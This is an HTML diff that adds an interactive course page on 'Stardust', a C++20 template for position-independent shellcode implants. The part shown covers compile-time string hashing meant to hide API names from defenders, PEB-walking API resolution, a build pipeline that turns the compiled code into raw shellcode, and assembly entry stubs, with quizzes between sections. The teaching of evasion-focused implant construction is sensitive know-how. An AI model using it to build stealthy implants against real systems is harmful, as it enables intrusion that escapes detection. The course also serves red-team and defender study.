@@ -1,0 +1,1337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stardust Deep Dive - Modern Implant Template Masterclass</title>
+<style>
+:root{--bg:#0a0a14;--surface:#10121f;--surface2:#181c2e;--border:#252a40;--accent:#c084fc;--accent2:#38bdf8;--green:#34d399;--red:#f87171;--yellow:#fbbf24;--text:#e2e8f0;--dim:#64748b;--code-bg:#0c0e18;--gradient:linear-gradient(135deg,#c084fc,#38bdf8)}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;line-height:1.7;overflow-x:hidden}
+::selection{background:var(--accent);color:var(--bg)}
+::-webkit-scrollbar{width:8px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
+nav{position:fixed;top:0;left:0;width:270px;height:100vh;background:var(--surface);border-right:1px solid var(--border);padding:20px 0;overflow-y:auto;z-index:100;transition:transform .3s}
+nav .logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:10px}
+nav .logo h2{background:var(--gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:1.3rem}
+nav .logo span{color:var(--dim);font-size:.72rem}
+nav a{display:flex;align-items:center;gap:10px;padding:9px 20px;color:var(--dim);text-decoration:none;font-size:.82rem;transition:all .2s;border-left:3px solid transparent}
+nav a:hover,nav a.active{color:var(--text);background:var(--surface2);border-left-color:var(--accent)}
+nav a .diff{font-size:.63rem;padding:2px 6px;border-radius:3px;font-weight:700}
+nav a .d1{background:#34d39930;color:var(--green)}
+nav a .d2{background:#fbbf2430;color:var(--yellow)}
+nav a .d3{background:#f8717130;color:var(--red)}
+.hamburger{display:none;position:fixed;top:15px;left:15px;z-index:200;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:6px;cursor:pointer;font-size:1.2rem}
+main{margin-left:270px;padding:40px;max-width:960px}
+.module{display:none;animation:fadeIn .4s}.module.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+h1{font-size:2rem;margin-bottom:10px;background:var(--gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+h2{font-size:1.45rem;color:var(--accent);margin:30px 0 15px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+h3{font-size:1.1rem;color:var(--text);margin:20px 0 10px}
+p{margin-bottom:15px;color:#cbd5e1}.subtitle{color:var(--dim);font-size:1rem;margin-bottom:30px}
+.diff-badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:.75rem;font-weight:700;margin-bottom:20px}
+.diff-badge.easy{background:#34d39930;color:var(--green)}.diff-badge.medium{background:#fbbf2430;color:var(--yellow)}.diff-badge.hard{background:#f8717130;color:var(--red)}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:25px;margin:20px 0}
+.card.highlight{border-left:4px solid var(--accent)}.card.warn{border-left:4px solid var(--yellow);background:#fbbf2408}.card.green{border-left:4px solid var(--green)}
+.card h4{margin-bottom:10px;color:var(--accent)}.card.warn h4{color:var(--yellow)}
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:20px;overflow-x:auto;margin:15px 0;font-size:.8rem;line-height:1.6;position:relative}
+pre .lang-tag{position:absolute;top:8px;right:12px;color:var(--dim);font-size:.68rem;text-transform:uppercase}
+code{font-family:'Cascadia Code','Fira Code',monospace}
+p code,.card code,li code{background:var(--code-bg);padding:2px 7px;border-radius:4px;font-size:.85em;color:var(--accent)}
+.diagram{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:30px;margin:20px 0;overflow-x:auto}
+.flow{display:flex;align-items:center;flex-wrap:wrap;gap:0;justify-content:center;margin:10px 0}
+.flow .box{background:var(--surface2);border:1px solid var(--border);padding:10px 16px;border-radius:8px;font-size:.8rem;text-align:center;min-width:100px;color:var(--text)}
+.flow .box.hl{border-color:var(--accent);color:var(--accent)}.flow .box.g{border-color:var(--green);color:var(--green)}.flow .box.r{border-color:var(--red);color:var(--red)}.flow .box.y{border-color:var(--yellow);color:var(--yellow)}.flow .box.b{border-color:var(--accent2);color:var(--accent2)}
+.flow .arrow{color:var(--dim);font-size:1.2rem;padding:0 4px;flex-shrink:0}
+table{width:100%;border-collapse:collapse;margin:15px 0;font-size:.85rem}
+th{background:var(--surface2);color:var(--accent);padding:12px;text-align:left;border-bottom:2px solid var(--border)}
+td{padding:10px 12px;border-bottom:1px solid var(--border)}tr:hover td{background:var(--surface2)}
+.quiz{background:var(--surface);border:2px solid var(--accent2);border-radius:12px;padding:25px;margin:25px 0}
+.quiz h4{color:var(--accent2);margin-bottom:15px;font-size:1.1rem}
+.quiz-q{margin-bottom:20px}.quiz-q p{font-weight:600;margin-bottom:10px}
+.quiz-q label{display:block;padding:10px 15px;margin:5px 0;border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:all .2s;font-size:.9rem}
+.quiz-q label:hover{border-color:var(--accent2);background:var(--surface2)}
+.quiz-q label.correct{border-color:var(--green);background:#34d39915;color:var(--green)}
+.quiz-q label.wrong{border-color:var(--red);background:#f8717115;color:var(--red)}
+.quiz-q .explain{display:none;margin-top:10px;padding:12px;background:var(--surface2);border-radius:8px;font-size:.85rem;border-left:3px solid var(--accent2)}
+.quiz-btn{background:var(--gradient);color:#fff;border:none;padding:10px 30px;border-radius:8px;cursor:pointer;font-weight:700;font-size:.9rem;transition:transform .1s}.quiz-btn:hover{transform:scale(1.03)}
+.quiz-result{margin-top:15px;padding:15px;border-radius:8px;font-weight:700;display:none}
+.progress-wrap{padding:10px 20px;border-bottom:1px solid var(--border)}
+.progress-bar{height:4px;background:var(--surface2);border-radius:2px;overflow:hidden}
+.progress-fill{height:100%;background:var(--gradient);transition:width .4s;border-radius:2px}
+.progress-text{font-size:.7rem;color:var(--dim);margin-top:4px}
+.nav-btns{display:flex;justify-content:space-between;margin-top:40px;padding-top:20px;border-top:1px solid var(--border)}
+.nav-btns button{background:var(--surface);border:1px solid var(--border);color:var(--text);padding:10px 24px;border-radius:8px;cursor:pointer;font-size:.9rem;transition:all .2s}
+.nav-btns button:hover{border-color:var(--accent);color:var(--accent)}
+.nav-btns button.primary{background:var(--gradient);border:none;color:#fff;font-weight:600}
+ul,ol{margin:10px 0 15px 25px}li{margin:5px 0;color:#cbd5e1}li strong{color:var(--text)}
+.versus{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:15px 0}
+.versus > div{background:var(--surface2);border-radius:8px;padding:15px;border:1px solid var(--border)}
+.versus > div h5{margin-bottom:8px;font-size:.9rem}
+@media(max-width:800px){nav{transform:translateX(-100%)}nav.open{transform:translateX(0)}.hamburger{display:block}main{margin-left:0;padding:20px;padding-top:60px}.versus{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav id="sidenav">
+<div class="logo"><h2>Stardust Course</h2><span>Modern Implant Template Masterclass</span></div>
+<div class="progress-wrap"><div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%"></div></div><div class="progress-text" id="progressText">0 / 10 modules</div></div>
+<a href="#" data-mod="0" class="active"><span class="diff d1">01</span> Why Stardust Exists</a>
+<a href="#" data-mod="1"><span class="diff d1">02</span> C++20 for Shellcode</a>
+<a href="#" data-mod="2"><span class="diff d1">03</span> Project Anatomy</a>
+<a href="#" data-mod="3"><span class="diff d2">04</span> Position-Independent Code</a>
+<a href="#" data-mod="4"><span class="diff d2">05</span> Compile-Time Hashing</a>
+<a href="#" data-mod="5"><span class="diff d2">06</span> PEB &amp; API Resolution</a>
+<a href="#" data-mod="6"><span class="diff d2">07</span> The symbol&lt;T&gt; Template</a>
+<a href="#" data-mod="7"><span class="diff d3">08</span> Linker Script &amp; Sections</a>
+<a href="#" data-mod="8"><span class="diff d3">09</span> Module Stomping</a>
+<a href="#" data-mod="9"><span class="diff d3">10</span> Full Chain &amp; Extending</a>
+</nav>
+
+<main id="content">
+
+<!-- ========= MODULE 0 ========= -->
+<div class="module active" id="mod0">
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 1: Why Stardust Exists</h1>
+<p class="subtitle">The problem with old-school shellcode loaders, and a modern answer.</p>
+
+<div class="card highlight">
+<h4>Context Check</h4>
+<p>If you completed the AceLdr course, you already know how reflective DLL loaders work. Stardust takes a <strong>radically different approach</strong>. Instead of loading a DLL reflectively, Stardust IS the implant - pure position-independent C++20 code compiled directly into shellcode. No PE headers, no DLL, no loader stub. Just raw code.</p>
+</div>
+
+<h2>The Problem with Reflective Loaders</h2>
+<p>Traditional reflective DLL injection (like AceLdr) works well but leaves artifacts:</p>
+
+<div class="versus">
+<div>
+<h5 style="color:var(--red)">Reflective DLL Loader (Traditional)</h5>
+<ul>
+<li>Full PE still exists in memory (headers, sections, IAT)</li>
+<li>Loader stub + DLL = larger payload</li>
+<li>Must parse PE headers, process relocations, resolve IAT</li>
+<li>PE signatures detectable by PE-sieve, Moneta</li>
+<li>Two components: the loader and the payload</li>
+</ul>
+</div>
+<div>
+<h5 style="color:var(--green)">Stardust (PIC Template)</h5>
+<ul>
+<li>No PE headers in memory at all</li>
+<li>~752 bytes (x64) / ~672 bytes (x86) base size</li>
+<li>No PE parsing, no relocations, no IAT</li>
+<li>Nothing for PE scanners to find</li>
+<li>One component: the shellcode IS the implant</li>
+</ul>
+</div>
+</div>
+
+<h2>What Stardust Actually Is</h2>
+<p>Stardust is a <strong>template</strong> - a skeleton you fill in with your implant logic. Out of the box, it demonstrates:</p>
+<ul>
+<li><strong>Position-independent code</strong> that works at any memory address</li>
+<li><strong>Compile-time FNV-1a hashing</strong> using C++20 <code>consteval</code></li>
+<li><strong>Dynamic API resolution</strong> via PEB walking + export table parsing</li>
+<li><strong>Dual architecture</strong> support (x86 and x64 from the same codebase)</li>
+<li><strong>Raw string support</strong> with the <code>symbol&lt;T&gt;</code> template</li>
+<li><strong>Module stomping</strong> test harness for injection</li>
+</ul>
+
+<h2>Stardust at a Glance</h2>
+<table>
+<tr><th>Metric</th><th>Value</th></tr>
+<tr><td>Author</td><td>Cracked5pider (C5)</td></tr>
+<tr><td>Language</td><td>C++20 + NASM Assembly</td></tr>
+<tr><td>Compiler</td><td>Clang (MinGW cross-compilation)</td></tr>
+<tr><td>x64 Release Size</td><td>~752 bytes</td></tr>
+<tr><td>x86 Release Size</td><td>~672 bytes</td></tr>
+<tr><td>Dependencies</td><td>None (nostdlib)</td></tr>
+<tr><td>Stars</td><td>1,300+</td></tr>
+<tr><td>Blog Post</td><td>5pider.net/blog/2024/01/27/modern-shellcode-implant-design</td></tr>
+</table>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Architecture Comparison</h4>
+<div style="display:flex;gap:20px;justify-content:center;flex-wrap:wrap">
+<div style="flex:1;min-width:280px">
+<p style="text-align:center;color:var(--red);font-weight:700;margin-bottom:10px">Traditional: Reflective DLL Loader</p>
+<div class="flow" style="flex-direction:column;gap:4px">
+<div class="box r" style="width:100%">Shellcode (Loader Stub)</div>
+<div class="box r" style="width:100%">PE Headers (MZ, NT, Sections)</div>
+<div class="box" style="width:100%">.text - Beacon Code</div>
+<div class="box" style="width:100%">.rdata - Import Table (IAT)</div>
+<div class="box" style="width:100%">.reloc - Base Relocations</div>
+</div>
+</div>
+<div style="flex:1;min-width:280px">
+<p style="text-align:center;color:var(--green);font-weight:700;margin-bottom:10px">Stardust: Pure PIC Shellcode</p>
+<div class="flow" style="flex-direction:column;gap:4px">
+<div class="box g" style="width:100%">.text$A - Entry + RipStart (ASM)</div>
+<div class="box g" style="width:100%">.text$B - All C++ implant code</div>
+<div class="box g" style="width:100%">.rdata - Strings (position-independent)</div>
+<div class="box g" style="width:100%">.text$C - RipData utility (ASM)</div>
+<div style="text-align:center;color:var(--green);font-size:.8rem">That's it. No headers. No tables. Just code.</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="quiz" id="quiz0">
+<h4>Pop Quiz: Why Stardust?</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: What is the fundamental difference between a reflective loader and Stardust?</p>
+<label data-opt="0"><input type="radio" name="q0_0"> Stardust is written in C++ instead of C</label>
+<label data-opt="1"><input type="radio" name="q0_0"> Stardust supports more Windows versions</label>
+<label data-opt="2"><input type="radio" name="q0_0"> Stardust compiles directly to PIC shellcode with no PE structure in memory</label>
+<label data-opt="3"><input type="radio" name="q0_0"> Stardust uses encryption while reflective loaders don't</label>
+<div class="explain">Reflective loaders take a full DLL and manually map it into memory, leaving PE artifacts. Stardust eliminates this entirely - C++ code compiles directly into position-independent shellcode. The final binary is extracted from the .text section with no PE headers, no IAT, no relocations.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: Approximately how large is the Stardust x64 release binary?</p>
+<label data-opt="0"><input type="radio" name="q0_1"> ~50 KB</label>
+<label data-opt="1"><input type="radio" name="q0_1"> ~752 bytes</label>
+<label data-opt="2"><input type="radio" name="q0_1"> ~4 KB</label>
+<label data-opt="3"><input type="radio" name="q0_1"> ~15 KB</label>
+<div class="explain">The base template compiles to approximately 752 bytes on x64 and 672 bytes on x86. This tiny size is achieved through aggressive optimization flags (-Os, -nostdlib, -s) and the elimination of all standard library dependencies.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz0')">Check Answers</button>
+<div class="quiz-result" id="quiz0-result"></div>
+</div>
+
+<div class="nav-btns"><span></span><button class="primary" onclick="goTo(1)">Next: C++20 for Shellcode &rarr;</button></div>
+</div>
+
+<!-- ========= MODULE 1 ========= -->
+<div class="module" id="mod1">
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 2: C++20 for Shellcode</h1>
+<p class="subtitle">How Stardust abuses modern C++ features for compile-time evasion.</p>
+
+<div class="card highlight">
+<h4>Wait, C++ for Shellcode?</h4>
+<p>Most shellcode is written in C or pure ASM. Using C++ sounds insane - classes, templates, virtual tables, exceptions... all that overhead. But Stardust carefully uses <strong>only the zero-cost features</strong> of C++20. The compiler does heavy lifting at build time so the runtime binary stays tiny.</p>
+</div>
+
+<h2>The Three C++20 Features That Matter</h2>
+
+<h3>1. <code>consteval</code> - Forced Compile-Time Execution</h3>
+<p>Unlike <code>constexpr</code> (which <em>may</em> run at compile time), <code>consteval</code> <strong>must</strong> run at compile time. The result is baked into the binary as a constant. No function call at runtime, no string in the binary:</p>
+
+<pre><code><span class="lang-tag">C++ - constexpr.h</span>namespace expr {
+    template &lt;typename T = char&gt;
+    consteval auto hash_string(    // consteval = MUST run at compile time
+        const T* string
+    ) -> uint32_t {
+        uint32_t hash = 0x811c9dc5;  // FNV-1a offset basis
+        uint8_t  byte = 0;
+
+        while ( *string ) {
+            byte = static_cast&lt;uint8_t&gt;( *string++ );
+            if ( byte >= 'a' ) byte -= 0x20;  // Case-insensitive
+            hash ^= byte;
+            hash *= 0x01000193;  // FNV-1a prime
+        }
+        return hash;
+    }
+}</code></pre>
+
+<div class="card">
+<h4>What Happens at Build Time</h4>
+<pre><code><span class="lang-tag">What you write</span>auto hash = expr::hash_string( "NtAllocateVirtualMemory" );</code></pre>
+<pre><code><span class="lang-tag">What the compiler produces (pseudocode)</span>auto hash = 0x1A2B3C4D;  // Just a constant integer. No string. No function call.</code></pre>
+<p>The string <code>"NtAllocateVirtualMemory"</code> exists only in your source code. It never makes it into the binary. Defenders running <code>strings</code> on the shellcode see nothing.</p>
+</div>
+
+<h3>2. Templates - Type-Safe API Resolution</h3>
+<p>Stardust uses templates to make API resolution type-safe. Instead of casting <code>void*</code> everywhere:</p>
+
+<pre><code><span class="lang-tag">C++ - resolve.h</span>namespace resolve {
+    template &lt;typename T&gt;
+    inline auto declfn api(
+        _In_ const uintptr_t module_base,
+        _In_ const uintptr_t symbol_hash
+    ) -> T* {
+        return reinterpret_cast&lt;T*&gt;( _api( module_base, symbol_hash ) );
+    }
+}
+
+// Usage: compiler knows the exact function signature
+decltype(MessageBoxA)* msgbox = RESOLVE_API(
+    reinterpret_cast&lt;uintptr_t&gt;(user32), MessageBoxA
+);</code></pre>
+
+<h3>3. <code>decltype</code> - Automatic Type Deduction</h3>
+<pre><code><span class="lang-tag">C++ - macros.h</span>#define D_API( x )  decltype( x ) * x;
+
+// Inside the instance class:
+struct {
+    D_API( LoadLibraryA )    // expands to: decltype(LoadLibraryA)* LoadLibraryA;
+    D_API( GetProcAddress )  // expands to: decltype(GetProcAddress)* GetProcAddress;
+};</code></pre>
+<p><code>decltype(LoadLibraryA)</code> gives the compiler the <strong>exact function signature</strong> of the real Windows API. Your function pointer is automatically the right type. No manual <code>typedef</code> needed.</p>
+
+<h2>What C++ Features Stardust AVOIDS</h2>
+<table>
+<tr><th>Feature</th><th>Why It's Banned</th></tr>
+<tr><td>Exceptions (<code>try/catch</code>)</td><td>Requires runtime support tables, huge overhead</td></tr>
+<tr><td>RTTI (<code>dynamic_cast</code>)</td><td>Type info tables bloat the binary</td></tr>
+<tr><td>STL containers</td><td>Depend on the C++ standard library (heap, exceptions)</td></tr>
+<tr><td>Virtual functions</td><td>vtable pointers aren't position-independent</td></tr>
+<tr><td>Global constructors</td><td>Require CRT initialization that doesn't exist</td></tr>
+<tr><td>SSE instructions</td><td>Disabled via <code>-mno-sse</code> for compatibility</td></tr>
+</table>
+
+<div class="card warn">
+<h4>The -nostdlib Flag</h4>
+<p>Stardust compiles with <code>-nostdlib</code>, meaning there is <strong>no C runtime, no C++ standard library</strong>. No <code>printf</code>, no <code>malloc</code>, no <code>std::string</code>, no <code>new</code>/<code>delete</code>. Every memory operation is done manually via <code>memory::copy()</code>, <code>memory::zero()</code>, or Windows API calls.</p>
+</div>
+
+<div class="quiz" id="quiz1">
+<h4>Pop Quiz: C++20 Features</h4>
+<div class="quiz-q" data-correct="0">
+<p>Q1: What is the difference between <code>constexpr</code> and <code>consteval</code>?</p>
+<label data-opt="0"><input type="radio" name="q1_0"> constexpr MAY run at compile time; consteval MUST run at compile time</label>
+<label data-opt="1"><input type="radio" name="q1_0"> constexpr is for variables; consteval is for functions</label>
+<label data-opt="2"><input type="radio" name="q1_0"> They're the same thing with different syntax</label>
+<label data-opt="3"><input type="radio" name="q1_0"> consteval is slower but more portable</label>
+<div class="explain">constexpr functions CAN be evaluated at compile time but may also run at runtime if called with non-constant arguments. consteval functions MUST be evaluated at compile time - the compiler errors if it can't. This guarantee is what makes hash_string safe: the string is guaranteed to vanish from the binary.</div>
+</div>
+<div class="quiz-q" data-correct="3">
+<p>Q2: Why does Stardust use <code>decltype(LoadLibraryA)* LoadLibraryA;</code>?</p>
+<label data-opt="0"><input type="radio" name="q1_1"> To make the code shorter</label>
+<label data-opt="1"><input type="radio" name="q1_1"> Because Windows requires it</label>
+<label data-opt="2"><input type="radio" name="q1_1"> For backwards compatibility with C</label>
+<label data-opt="3"><input type="radio" name="q1_1"> To automatically get the correct function signature without manual typedefs</label>
+<div class="explain">decltype(LoadLibraryA) resolves to the exact function signature: HMODULE(LPCSTR). The * makes it a function pointer. This means you can call it with the same parameters as the real API and the compiler will type-check everything for you. No error-prone manual typedefs.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz1')">Check Answers</button>
+<div class="quiz-result" id="quiz1-result"></div>
+</div>
+
+<div class="nav-btns"><button onclick="goTo(0)">&larr; Previous</button><button class="primary" onclick="goTo(2)">Next: Project Anatomy &rarr;</button></div>
+</div>
+
+<!-- ========= MODULE 2 ========= -->
+<div class="module" id="mod2">
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 3: Project Anatomy</h1>
+<p class="subtitle">Every file, every folder, and why it exists.</p>
+
+<h2>Directory Structure</h2>
+<pre><code><span class="lang-tag">File Tree</span>Stardust/
+├── Makefile              # Build system (Clang + NASM)
+├── CMakeLists.txt        # Alt build for development/debugging
+├── README.md
+├── bin/
+│   └── obj/              # Compiled object files
+├── include/
+│   ├── common.h          # Master header, instance class, symbol&lt;T&gt;
+│   ├── constexpr.h       # Compile-time FNV-1a hashing
+│   ├── macros.h          # D_API, G_SYM, RESOLVE_IMPORT macros
+│   ├── memory.h          # zero(), copy(), compare()
+│   ├── native.h          # Windows NT structures (22,000+ lines)
+│   └── resolve.h         # API/module resolution declarations
+├── scripts/
+│   └── linker.ld         # Custom section ordering
+├── src/
+│   ├── main.cc           # Entry point + implant logic
+│   ├── resolve.cc        # PEB walking + export table parsing
+│   └── asm/
+│       ├── entry.x64.asm # x64 entry point + RipStart
+│       ├── entry.x86.asm # x86 entry point + RipStart
+│       ├── utils.x64.asm # x64 RipData (data section locator)
+│       └── utils.x86.asm # x86 RipData
+├── test/
+│   └── stomper.cc        # Module stomping injection tester
+└── static/
+    └── *.png             # Demo screenshots</code></pre>
+
+<h2>File Dependency Graph</h2>
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">How Files Connect</h4>
+<div class="flow" style="flex-direction:column;gap:4px;max-width:550px;margin:0 auto">
+<div class="box hl" style="width:100%"><strong>main.cc</strong> &mdash; includes common.h, constexpr.h, resolve.h</div>
+<div style="text-align:center;color:var(--dim)">&darr; calls entry() from</div>
+<div class="box b" style="width:100%"><strong>entry.x64.asm / entry.x86.asm</strong> &mdash; stardust() entry, RipStart()</div>
+<div style="text-align:center;color:var(--dim)">&darr; main.cc uses APIs resolved by</div>
+<div class="box y" style="width:100%"><strong>resolve.cc</strong> &mdash; module() walks PEB, _api() walks exports</div>
+<div style="text-align:center;color:var(--dim)">&darr; string addresses found via</div>
+<div class="box b" style="width:100%"><strong>utils.x64.asm / utils.x86.asm</strong> &mdash; RipData()</div>
+<div style="text-align:center;color:var(--dim)">&darr; all section ordering controlled by</div>
+<div class="box g" style="width:100%"><strong>scripts/linker.ld</strong> &mdash; .text$A, .text$B, .rdata, .text$C</div>
+</div>
+</div>
+
+<h2>Build Pipeline</h2>
+<pre><code><span class="lang-tag">Makefile - Build Steps</span># 1. Assemble entry points and utilities for both architectures
+nasm -f win64 src/asm/entry.x64.asm -o bin/obj/entry.x64.obj
+nasm -f win64 src/asm/utils.x64.asm -o bin/obj/utils.x64.obj
+
+# 2. Compile C++ sources with Clang targeting MinGW
+clang -target x86_64-w64-mingw32 src/main.cc  -o bin/obj/main.x64.obj  -c $CFLAGS
+clang -target x86_64-w64-mingw32 src/resolve.cc -o bin/obj/resolve.x64.obj -c $CFLAGS
+
+# 3. Link everything with custom linker script
+clang -target x86_64-w64-mingw32 bin/obj/*.x64.obj -o bin/stardust.x64.exe $CFLAGS
+#    (CFLAGS includes: -Wl,-Tscripts/linker.ld)
+
+# 4. Extract .text section as raw shellcode
+objcopy --dump-section .text=bin/stardust.x64.bin bin/stardust.x64.exe
+
+# 5. Delete the intermediate PE
+rm bin/stardust.x64.exe</code></pre>
+
+<div class="card">
+<h4>Key Compiler Flags</h4>
+<table>
+<tr><th>Flag</th><th>Purpose</th></tr>
+<tr><td><code>-target x86_64-w64-mingw32</code></td><td>Cross-compile for Windows x64</td></tr>
+<tr><td><code>-std=c++20</code></td><td>Enable C++20 features (consteval, concepts)</td></tr>
+<tr><td><code>-Os</code></td><td>Optimize for size</td></tr>
+<tr><td><code>-nostdlib</code></td><td>No C/C++ standard library</td></tr>
+<tr><td><code>-fno-exceptions</code></td><td>Disable C++ exceptions</td></tr>
+<tr><td><code>-fPIC</code></td><td>Position-independent code</td></tr>
+<tr><td><code>-masm=intel</code></td><td>Use Intel assembly syntax</td></tr>
+<tr><td><code>-mno-sse</code></td><td>Disable SSE instructions</td></tr>
+<tr><td><code>-fms-extensions</code></td><td>Microsoft extensions (SAL annotations, etc.)</td></tr>
+<tr><td><code>-Wl,-Tscripts/linker.ld</code></td><td>Custom linker script for section layout</td></tr>
+</table>
+</div>
+
+<div class="card warn">
+<h4>Clang vs GCC (AceLdr used GCC)</h4>
+<p>AceLdr uses <code>x86_64-w64-mingw32-gcc</code>. Stardust uses <strong>Clang</strong> with <code>-target x86_64-w64-mingw32</code>. Why? Clang has better C++20 support, especially for <code>consteval</code>. It also tends to produce smaller binaries with <code>-Os</code>. The <code>-target</code> flag lets a single Clang installation cross-compile for both x86 and x64 Windows.</p>
+</div>
+
+<div class="quiz" id="quiz2">
+<h4>Pop Quiz: Project Structure</h4>
+<div class="quiz-q" data-correct="1">
+<p>Q1: How is the final shellcode extracted from the compiled PE?</p>
+<label data-opt="0"><input type="radio" name="q2_0"> A Python script searches for a marker string</label>
+<label data-opt="1"><input type="radio" name="q2_0"> objcopy dumps the .text section directly to a bin file</label>
+<label data-opt="2"><input type="radio" name="q2_0"> The PE is simply renamed to .bin</label>
+<label data-opt="3"><input type="radio" name="q2_0"> The build system produces shellcode natively</label>
+<div class="explain">Stardust uses objcopy --dump-section .text=output.bin to extract just the .text section from the compiled PE. This is different from AceLdr which used a Python script with an "ACELDR" end marker. The objcopy approach is cleaner since the linker script already ensures everything is in .text.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q2: How many C++ source files does Stardust have?</p>
+<label data-opt="0"><input type="radio" name="q2_1"> 6 (one per module)</label>
+<label data-opt="1"><input type="radio" name="q2_1"> 1 (everything in main.cc)</label>
+<label data-opt="2"><input type="radio" name="q2_1"> 2 (main.cc and resolve.cc)</label>
+<label data-opt="3"><input type="radio" name="q2_1"> 4 (main, resolve, hash, transport)</label>
+<div class="explain">Stardust is remarkably minimal: just main.cc (entry point + implant logic) and resolve.cc (PEB walking + export parsing). Everything else is in headers or assembly. This minimalism is key to the tiny binary size.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz2')">Check Answers</button>
+<div class="quiz-result" id="quiz2-result"></div>
+</div>
+
+<div class="nav-btns"><button onclick="goTo(1)">&larr; Previous</button><button class="primary" onclick="goTo(3)">Next: Position-Independent Code &rarr;</button></div>
+</div>
+
+<!-- ========= MODULE 3 ========= -->
+<div class="module" id="mod3">
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 4: Position-Independent Code</h1>
+<p class="subtitle">RipStart, RipData, and the call/pop trick on two architectures.</p>
+
+<div class="card highlight">
+<h4>The Core Challenge</h4>
+<p>Shellcode gets injected at an <strong>unknown address</strong>. It can't use absolute addresses for data or functions. Stardust solves this with two assembly functions: <code>RipStart()</code> (where does my code begin?) and <code>RipData()</code> (where is my data section?). Everything else is built on top of these two primitives.</p>
+</div>
+
+<h2>x64: RipStart</h2>
+<pre><code><span class="lang-tag">ASM - entry.x64.asm</span>[BITS 64]
+DEFAULT REL
+EXTERN entry
+GLOBAL stardust
+GLOBAL RipStart
+
+[SECTION .text$A]
+
+stardust:                          ; Shellcode entry point
+    push  rsi                      ; Save RSI
+    mov   rsi, rsp                 ; Save original stack pointer
+    and   rsp, 0FFFFFFFFFFFFFFF0h  ; Align stack to 16 bytes (required by ABI)
+    sub   rsp, 020h                ; 32-byte shadow space for Windows x64 ABI
+    call  entry                    ; Call our C++ entry() function
+    mov   rsp, rsi                 ; Restore stack
+    pop   rsi                      ; Restore RSI
+    ret
+
+RipStart:
+    call  RipPtr                   ; CALL pushes address of next instruction
+    ret                            ; This ret returns RAX to caller
+
+RipPtr:
+    mov   rax, [rsp]              ; RAX = return address (pushed by CALL)
+    sub   rax, 0x1b               ; Subtract offset back to stardust label
+    ret                            ; RAX now = address of stardust (shellcode start)</code></pre>
+
+<div class="card">
+<h4>Breaking Down the 0x1b Offset</h4>
+<p>When <code>RipStart</code> calls <code>RipPtr</code>, the return address on the stack points to the <code>ret</code> after <code>call RipPtr</code>. The magic number <code>0x1b</code> (27 decimal) is the distance in bytes from <code>stardust:</code> to that return address. This is known at compile time because all the instructions between them have fixed sizes.</p>
+</div>
+
+<h2>x86: Same Concept, Different ABI</h2>
+<pre><code><span class="lang-tag">ASM - entry.x86.asm</span>[BITS 32]
+DEFAULT REL
+EXTERN _entry
+GLOBAL _stardust
+GLOBAL _RipStart
+
+[SECTION .text$A]
+
+_stardust:                    ; x86 entry point (note underscore prefix)
+    push  ebp                 ; Standard x86 prologue
+    mov   ebp, esp
+    call  _entry              ; Call C++ entry function
+    mov   esp, ebp
+    pop   ebp
+    ret
+
+_RipStart:
+    call  _RipPtr
+    ret
+
+_RipPtr:
+    mov   eax, [esp]          ; EAX = return address
+    sub   eax, 0x11           ; Different offset (x86 instructions are shorter)
+    ret</code></pre>
+
+<h2>RipData: Finding the Data Section</h2>
+<p><code>RipData()</code> sits in <code>.text$C</code> - the LAST code section, right after <code>.rdata</code>. This strategic placement means it can calculate where <code>.rdata</code> begins:</p>
+
+<pre><code><span class="lang-tag">ASM - utils.x64.asm</span>[BITS 64]
+DEFAULT REL
+GLOBAL RipData
+
+[SECTION .text$C]        ; Placed AFTER .rdata in the linker script
+
+RipData:
+    call  RetPtrData     ; Push return address
+    ret
+
+RetPtrData:
+    mov   rax, [rsp]     ; RAX = address of "ret" after call
+    sub   rax, 0x5       ; Back up to start of RipData
+    ret                  ; RAX = address of RipData function</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Memory Layout and RIP-Relative Addressing</h4>
+<div style="max-width:550px;margin:0 auto;font-size:.82rem">
+<div style="display:flex;gap:0;flex-direction:column">
+<div style="padding:12px;background:var(--accent);color:var(--bg);border-radius:8px 8px 0 0;font-weight:700;text-align:center">.text$A &mdash; stardust(), RipStart(), RipPtr()</div>
+<div style="padding:12px;background:#7c3aed;color:#fff;text-align:center;font-weight:700">.text$B &mdash; entry(), instance(), resolve::module(), resolve::_api()</div>
